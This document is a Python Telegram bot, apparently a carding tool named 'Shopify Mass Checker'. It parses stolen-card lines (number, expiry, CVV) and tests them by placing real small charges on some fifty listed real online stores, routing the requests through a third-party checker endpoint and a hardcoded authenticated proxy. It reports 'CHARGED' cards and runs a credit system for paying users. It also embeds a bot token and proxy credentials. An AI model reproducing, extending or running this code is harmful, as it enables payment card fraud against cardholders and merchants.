import asyncio
import aiohttp
import json
import re
import logging
import time
import html
import os
import sys
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
from telegram.error import TelegramError

# Initialize logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8415055284:AAGrhcc5-ZK3H92h6ehEDDJ7xU2hOY424A0")
ADMIN_ID = 5218397363
DEVELOPER_NAME = "ᴍʀ❦ᴘᴇʀꜰᴇᴄᴛ"

# PROXY Configuration
PROXY_URL = "209.174.185.196:6226"
PROXY_AUTH = "25chilna:password"
FULL_PROXY = f"http://{PROXY_AUTH}@{PROXY_URL}"

# SHOPIFY SITES
SHOPIFY_SITES = [
    "https://vaporesso-store.myshopify.com",
    "https://le-mini-macaron-2.myshopify.com",
    "https://element-tattoo-supplies.myshopify.com",
    "https://hangerinkok.myshopify.com",
    "https://drmtlgy.myshopify.com",
    "https://132461-96.myshopify.com",
    "https://bodycandy-2.myshopify.com",
    "https://jenteal-soaps.myshopify.com",
    "https://primrosecottage.myshopify.com",
    "https://punisher.myshopify.com",
    "https://razorcake.myshopify.com",
    "https://rockbottomje.myshopify.com",
    "https://youre-on-the-money.myshopify.com",
    "https://3e37aa.myshopify.com",
    "https://dev-goodybeads.myshopify.com",
    "https://eos-designs-studio.myshopify.com",
    "https://anthroverse.myshopify.com",
    "https://fishandsave.myshopify.com",
    "https://motive-products-2.myshopify.com",
    "https://5ce225.myshopify.com",
    "https://olyvogue.myshopify.com",
    "https://park-east-ny.myshopify.com",
    "https://cnocoutdoors.com",
    "https://elyssaportraitcreations.myshopify.com",
    "https://store.perrinbrewing.com",
    "https://customamsteelproducts.com",
    "https://kingdomcomecards.com",
    "https://fulfilledgoods.com",
    "https://athriftynotion.com",
    "https://dingall.com",
    "https://spacefoxcoffee.com",
    "https://mothershipatx.com",
    "https://www.oldstatefarms.com",
    "https://www.skittenz.com",
    "https://thefloramodiste.com",
    "https://shop.jackalopebrew.com",
    "https://breakroasters.com",
    "https://shop.theelectricbrewery.com",
    "https://oliesoutlook.com",
    "https://mosaicmoose.net",
    "https://shop.chastity.com",
    "https://mbsexpendables.com",
    "https://www.swiitcreations.com",
    "https://risc-v-store.myshopify.com",
    "https://www.editionnaam.com",
    "https://fcdlabels.com",
    "https://www.captainschocolate.com",
    "https://amprevolt.com",
    "https://softtouchnailproducts.com",
    "https://www.beyondyouryaad.com"
]

# Bot Configuration
MAX_THREADS = 25
MAX_CARDS_PER_REQUEST = 50
CREDITS_PER_CARD = 2
DEFAULT_CREDITS = 100

# Data storage
USERS_FILE = 'users.json'

def load_json(filepath):
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_json(filepath, data):
    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except:
        return False

def get_user_data(user_id):
    users = load_json(USERS_FILE)
    user_str = str(user_id)
    
    if user_str not in users:
        users[user_str] = {
            'credits': DEFAULT_CREDITS,
            'total_checks': 0,
            'successful_charges': 0,
            'last_check': None,
            'joined_at': datetime.now().isoformat()
        }
        save_json(USERS_FILE, users)
    
    return users[user_str]

def update_user_data(user_id, data):
    users = load_json(USERS_FILE)
    user_str = str(user_id)
    users[user_str] = {**users.get(user_str, {}), **data}
    save_json(USERS_FILE, users)

def extract_card_details(text):
    """Extract CC details from text"""
    patterns = [
        r'(\d{15,16})[|/\s]+(\d{1,2})[|/\s]+(\d{2,4})[|/\s]+(\d{3,4})',
        r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            ccn, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 2:
                yy = "20" + yy
            return {
                "full": f"{ccn}|{mm}|{yy}|{cvv}",
                "number": ccn,
                "month": mm,
                "year": yy,
                "cvv": cvv,
                "bin": ccn[:6]
            }
    return None

async def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bank_name = data.get("bank", {}).get("name", "N/A")
                    country_name = data.get("country", {}).get("name", "N/A")
                    country_emoji = data.get("country", {}).get("emoji", "")
                    
                    return {
                        "brand": (data.get("scheme", "N/A") or "N/A").upper(),
                        "bank": (bank_name or "N/A").upper(),
                        "country": f"{(country_name or 'N/A').upper()} {country_emoji}",
                        "type": (data.get("type", "N/A") or "N/A").upper()
                    }
    except Exception as e:
        logger.error(f"BIN lookup failed: {e}")
    
    return {"brand": "N/A", "bank": "N/A", "country": "N/A", "type": "N/A"}

async def check_shopify_payment(card_details, site_url):
    """Check Shopify payment with proxy"""
    start_time = time.time()
    
    try:
        api_url = f"https://shopi-production-7ef9.up.railway.app/?cc={card_details['full']}&url={site_url}&proxy={FULL_PROXY}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(api_url, headers=headers) as resp:
                response_text = await resp.text()
                elapsed = round(time.time() - start_time, 2)
                
                try:
                    data = json.loads(response_text)
                except:
                    data = {"Response": response_text[:100]}
                
                return {
                    "success": "Order completed 💎" in data.get("Response", ""),
                    "response": data.get("Response", "Unknown"),
                    "price": data.get("Price", "1.59"),
                    "gate": data.get("Gate", "Shopify Payments"),
                    "site": data.get("Site", site_url),
                    "elapsed": elapsed,
                    "raw_data": data
                }
                
    except asyncio.TimeoutError:
        return {
            "success": False,
            "response": "Request timeout",
            "price": "1.59",
            "gate": "Shopify Payments",
            "site": site_url,
            "elapsed": round(time.time() - start_time, 2),
            "raw_data": {}
        }
    except Exception as e:
        return {
            "success": False,
            "response": f"Error: {str(e)[:50]}",
            "price": "1.59",
            "gate": "Shopify Payments",
            "site": site_url,
            "elapsed": round(time.time() - start_time, 2),
            "raw_data": {}
        }

async def process_cards_concurrently(cards, site_url):
    """Process cards with thread control"""
    semaphore = asyncio.Semaphore(MAX_THREADS)
    results = []
    
    async def process_with_semaphore(card):
        async with semaphore:
            return await check_shopify_payment(card, site_url)
    
    tasks = [process_with_semaphore(card) for card in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results

def format_result_message(card_details, result, bin_info):
    """Format individual card result"""
    if isinstance(result, Exception):
        status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
        response_msg = f"Error: {str(result)[:80]}"
        price = "1.59"
        elapsed = 0
    else:
        if "Order completed 💎" in result.get("response", ""):
            status = "CHARGED ❤️‍🔥"
        else:
            status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
        
        response_msg = result.get("response", "No response")
        price = result.get("price", "1.59")
        elapsed = result.get("elapsed", 0)
    
    # Ensure bin_info is a dictionary
    if not isinstance(bin_info, dict):
        bin_info = {"bank": "N/A", "country": "N/A", "brand": "N/A"}
    
    return (
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝘾𝙖𝙧𝙙: <code>{html.escape(card_details['full'])}</code>\n"
        f"• 𝙎𝙩𝙖𝙩𝙪𝙨: <b>{status}</b>\n"
        f"• 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: <code>{html.escape(str(response_msg)[:100])}</code>\n"
        f"• 𝙋𝙧𝙞𝙘𝙚: ${price}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"» 𝘽𝙞𝙣: <code>{card_details.get('bin', 'N/A')}</code>\n"
        f"» 𝘽𝙖𝙣𝙠: <code>{html.escape(bin_info.get('bank', 'N/A'))}</code>\n"
        f"» 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{html.escape(bin_info.get('country', 'N/A'))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"» 𝙋𝙧𝙤𝙭𝙮: LIVE • ROTATING\n"
        f"» 𝙏𝙞𝙢𝙚: {elapsed}s\n"
        f"» 𝘽𝙮: {DEVELOPER_NAME}\n"
    )

async def msp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /msp command"""
    user = update.effective_user
    
    # Admin check
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ This bot is for admin use only.")
        return
    
    # Get cards
    cards = []
    if update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""
        for line in text.split('\n'):
            card = extract_card_details(line)
            if card:
                cards.append(card)
    elif context.args:
        text = " ".join(context.args)
        for line in text.split('\n'):
            card = extract_card_details(line)
            if card:
                cards.append(card)
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.\n\nFormat: 5312590016282230|12|2027|701")
        return
    
    if len(cards) > MAX_CARDS_PER_REQUEST:
        await update.message.reply_text(f"❌ Max {MAX_CARDS_PER_REQUEST} cards per request.")
        return
    
    # Check credits
    user_data = get_user_data(user.id)
    needed_credits = len(cards) * CREDITS_PER_CARD
    
    if user_data['credits'] < needed_credits:
        await update.message.reply_text(
            f"❌ Insufficient credits!\n"
            f"Needed: {needed_credits}\n"
            f"Available: {user_data['credits']}"
        )
        return
    
    # Start processing
    processing_msg = await update.message.reply_text(
        f"🔍 Processing {len(cards)} cards...\n"
        f"Threads: {MAX_THREADS}\n"
        f"Sites: {len(SHOPIFY_SITES)}\n"
        f"Status: Starting..."
    )
    
    start_time = time.time()
    
    # Process cards
    all_results = []
    successful_cards = []
    failed_cards = []
    
    # Get BIN info first
    bin_tasks = [get_bin_info(card['bin']) for card in cards]
    bin_results = await asyncio.gather(*bin_tasks, return_exceptions=True)
    
    # Try each site for each card
    for site in SHOPIFY_SITES:
        if len(successful_cards) >= len(cards):
            break
            
        # Update status
        try:
            await processing_msg.edit_text(
                f"🔍 Processing {len(cards)} cards...\n"
                f"Threads: {MAX_THREADS}\n"
                f"Current Site: {site[:30]}...\n"
                f"Progress: {len(successful_cards)}/{len(cards)} charged"
            )
        except:
            pass
        
        # Process remaining cards
        remaining_cards = [card for i, card in enumerate(cards) 
                          if i >= len(successful_cards) and i < len(cards)]
        
        if not remaining_cards:
            break
        
        results = await process_cards_concurrently(remaining_cards[:MAX_THREADS], site)
        
        # Process results
        for i, (card, result, bin_info) in enumerate(zip(remaining_cards, results, bin_results)):
            idx = cards.index(card)
            
            if isinstance(result, Exception) or not result.get("success"):
                failed_cards.append((card, result, bin_info))
            else:
                successful_cards.append((card, result, bin_info))
                
                # Send successful result immediately
                msg = format_result_message(card, result, bin_info)
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    
    total_elapsed = round(time.time() - start_time, 2)
    
    # Send failed results
    if failed_cards:
        await update.message.reply_text(f"❌ DECLINED CARDS ({len(failed_cards)})")
        
        for card, result, bin_info in failed_cards[:10]:  # Limit to 10 failed cards
            msg = format_result_message(card, result, bin_info)
            await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    
    # Update credits (only for successful charges)
    if successful_cards:
        credits_deducted = len(successful_cards) * CREDITS_PER_CARD
        user_data['credits'] -= credits_deducted
        user_data['total_checks'] += len(cards)
        user_data['successful_charges'] += len(successful_cards)
        user_data['last_check'] = datetime.now().isoformat()
        update_user_data(user.id, user_data)
    
    # Send summary
    summary = (
        f"📊 𝙎𝙐𝙈𝙈𝘼𝙍𝙔 𝙍𝙀𝙋𝙊𝙍𝙏\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: {len(cards)}\n"
        f"• 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ❤️‍🔥: {len(successful_cards)}\n"
        f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌: {len(failed_cards)}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 𝙐𝙨𝙚𝙙: {len(successful_cards) * CREDITS_PER_CARD}\n"
        f"• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {user_data['credits']}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚: {total_elapsed}s\n"
        f"• 𝙎𝙞𝙩𝙚𝙨 𝙐𝙨𝙚𝙙: {min(len(SHOPIFY_SITES), len(cards))}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(summary, parse_mode=ParseMode.HTML)
    
    # Cleanup
    try:
        await processing_msg.delete()
    except:
        pass

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show credits"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    message = (
        f"💰 𝘾𝙍𝙀𝘿𝙄𝙏 𝘽𝘼𝙇𝘼𝙉𝘾𝙀\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙐𝙨𝙚𝙧: {user.first_name}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {user_data['credits']}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨: {user_data['total_checks']}\n"
        f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡: {user_data['successful_charges']}\n"
        f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙍𝙖𝙩𝙚: {round((user_data['successful_charges']/user_data['total_checks']*100) if user_data['total_checks'] > 0 else 0, 1)}%\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝘾𝙤𝙨𝙩/𝘾𝙖𝙧𝙙: {CREDITS_PER_CARD} credits\n"
        f"• 𝙊𝙣𝙡𝙮 𝙘𝙝𝙖𝙧𝙜𝙚𝙙 𝙛𝙤𝙧 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 orders\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(message)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    message = (
        f"✨ 𝙎𝙃𝙊𝙋𝙄𝙁𝙔 𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝘽𝙊𝙏 ✨\n\n"
        f"👤 𝙐𝙨𝙚𝙧: {user.first_name}\n"
        f"🆔 𝙄𝘿: {user.id}\n\n"
        f"📋 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎:\n"
        f"• /msp - Mass check cards\n"
        f"• /credits - Check credit balance\n"
        f"• /addcredits <amount> - Add credits (admin)\n\n"
        f"⚙️ 𝘾𝙊𝙉𝙁𝙄𝙂:\n"
        f"• Max Threads: {MAX_THREADS}\n"
        f"• Max Cards: {MAX_CARDS_PER_REQUEST}\n"
        f"• Credits/Card: {CREDITS_PER_CARD}\n"
        f"• Sites: {len(SHOPIFY_SITES)}\n"
        f"• Proxy: ROTATING\n\n"
        f"👨‍💻 𝘿𝙚𝙫: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(message)

async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add credits"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
    
    try:
        amount = int(context.args[0])
        if amount <= 0:
            await update.message.reply_text("❌ Positive amount only.")
            return
        
        target_id = int(context.args[1]) if len(context.args) > 1 else update.effective_user.id
        
        user_data = get_user_data(target_id)
        user_data['credits'] += amount
        update_user_data(target_id, user_data)
        
        await update.message.reply_text(
            f"✅ Credits added!\n"
            f"Amount: {amount}\n"
            f"User: {target_id}\n"
            f"New Balance: {user_data['credits']}"
        )
        
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ Usage: /addcredits <amount> [user_id]")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot stats"""
    users = load_json(USERS_FILE)
    
    total_users = len(users)
    total_credits = sum(user.get('credits', 0) for user in users.values())
    total_checks = sum(user.get('total_checks', 0) for user in users.values())
    total_charges = sum(user.get('successful_charges', 0) for user in users.values())
    
    message = (
        f"📊 𝘽𝙊𝙏 𝙎𝙏𝘼𝙏𝙎\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙐𝙨𝙚𝙧𝙨: {total_users}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {total_credits}\n"
        f"• 𝘾𝙝𝙚𝙘𝙠𝙨: {total_checks}\n"
        f"• 𝘾𝙝𝙖𝙧𝙜𝙚𝙨: {total_charges}\n"
        f"• 𝙍𝙖𝙩𝙚: {round((total_charges/total_checks*100) if total_checks > 0 else 0, 1)}%\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙎𝙞𝙩𝙚𝙨: {len(SHOPIFY_SITES)}\n"
        f"• 𝙏𝙝𝙧𝙚𝙖𝙙𝙨: {MAX_THREADS}\n"
        f"• 𝙋𝙧𝙤𝙭𝙮: ACTIVE\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(message)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Error handler"""
    logger.error(f"Update {update} caused error: {context.error}")
    
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"❌ Error occurred:\n{str(context.error)[:100]}"
            )
        except:
            pass

def main():
    """Main function"""
    print("="*60)
    print("SHOPIFY MASS CHECK BOT")
    print("="*60)
    print(f"Token: {BOT_TOKEN[:15]}...")
    print(f"Admin: {ADMIN_ID}")
    print(f"Threads: {MAX_THREADS}")
    print(f"Sites: {len(SHOPIFY_SITES)}")
    print(f"Proxy: {PROXY_URL}")
    print("="*60)
    
    # Validate token
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Set BOT_TOKEN environment variable!")
        sys.exit(1)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("msp", msp_command))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("addcredits", addcredits_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    print("✅ Bot starting...")
    print("="*60)
    
    # Start polling
    application.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == '__main__':
    main()
